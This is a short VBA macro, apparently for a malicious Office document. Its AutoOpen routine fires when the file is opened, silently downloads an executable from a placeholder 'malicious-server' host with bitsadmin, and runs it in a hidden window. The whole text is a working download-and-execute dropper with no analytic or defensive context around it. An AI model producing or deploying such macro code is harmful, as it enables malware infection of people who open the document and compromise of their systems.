Sub AutoOpen()
    Dim objShell As Object

    ' Download and execute a payload
    Dim command As String
    command = "cmd.exe /c bitsadmin /transfer download http://malicious-server/payload.exe C:\Temp\payload.exe && start C:\Temp\payload.exe"
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run command, 0, False ' Run hidden
End Sub
